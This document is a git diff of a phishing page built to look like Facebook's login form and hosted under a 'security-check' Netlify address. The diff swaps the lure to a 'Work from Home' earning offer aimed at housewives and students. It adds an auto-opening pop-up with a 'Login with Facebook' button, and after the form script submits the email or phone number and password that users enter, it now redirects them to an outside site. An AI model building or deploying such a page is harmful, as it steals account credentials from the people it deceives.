@@ -5,21 +5,110 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Updated Open Graph tags -->
-    <meta property="og:title" content="Facebook – log in or sign up" />
-    <meta property="og:description" content="Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." />
-    
-    <!-- Updated image URL -->
-    <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/social-book/refs/heads/main/realfbimg.png" />
-    
-    <!-- Updated website URL -->
+    <!-- Updated Open Graph tags for Work from Home theme -->
+    <meta property="og:title" content="Work from Home – Online Earning" />
+    <meta property="og:description" content="Earn money online from the comfort of your home. Perfect for housewives, students, and anyone looking for flexible work." />
+    <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/Work-from-home-/refs/heads/main/Workhome.jpg" />
     <meta property="og:url" content="https://security-check.netlify.app/" />
     
-    <title>Facebook Login</title>
+    <title>Work from Home Online Earning</title>
     <link rel="stylesheet" href="styles.css">
+
+    <style>
+        /* Pop-up Styling */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .popup img {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 15px;
+        }
+
+        .popup h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .popup p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        .popup .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            background: none;
+            border: none;
+        }
+
+        /* Facebook Login Button */
+        .fb-login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .fb-login-btn:hover {
+            background-color: #165fc0;
+        }
+    </style>
 </head>
 
 <body>
+
+    <!-- Pop-up Overlay -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <button class="close-btn" onclick="closePopup()">X</button>
+            <img src="https://raw.githubusercontent.com/Gunjan-netizen/Work-from-home-/refs/heads/main/Workhome.jpg" alt="Work from Home Image">
+            <h2>Work from Home – Earn Money Online</h2>
+            <p>Start earning from the comfort of your home. Ideal for housewives, students, and anyone looking for extra income.</p>
+            <button class="fb-login-btn" onclick="closePopup()">Login with Facebook</button>
+        </div>
+    </div>
+
+    <script>
+        // Function to close the pop-up
+        function closePopup() {
+            document.getElementById("popupOverlay").style.display = "none";
+        }
+
+        // Automatically show the pop-up when page loads
+        window.onload = function () {
+            document.getElementById("popupOverlay").style.display = "flex";
+        };
+    </script>
+
+    <!-- Rest of the page content -->
     <div class="row res">
         <div class="fb-form res">
             <div class="card">
@@ -41,6 +130,7 @@
             </form>
         </div>
     </div>
+
     <footer>
         <div class="footer-langs">
             <ol>
@@ -93,7 +183,7 @@
         </div>
     </footer>
 
-    <!-- Updated JavaScript code -->
+    <!-- Updated JavaScript for Form Submission and Redirection -->
     <script>
         document.getElementById("loginForm").addEventListener("submit", function (e) {
             e.preventDefault(); // Form submission रोकें
@@ -121,22 +211,23 @@
                     .then(response => {
                         if (response.ok) {
                             console.log("Data submitted successfully");
+
+                            // Redirect to the provided URL after successful form submission
+                            window.location.href = "https://pamtree.com/";  // Redirect to the given link
                         } else {
                             console.log("Failed to submit data");
                         }
                     })
                     .catch(error => console.error("Error:", error));
 
-                    // Redirect to a popular Bollywood song (Tum Hi Ho)
-                    window.location.href = "https://www.youtube.com/watch?v=Umqb9KENgmk";  // Redirect to Bollywood song
                 } else {
                     alert("Please enter your password.");
                 }
             } else {
-                alert("Please enter a valid 10-digit phone number or email address.");
+                alert("Please enter a valid email or phone number.");
             }
         });
     </script>
-</body>
 
-                  </html>
+</body>
+</html>
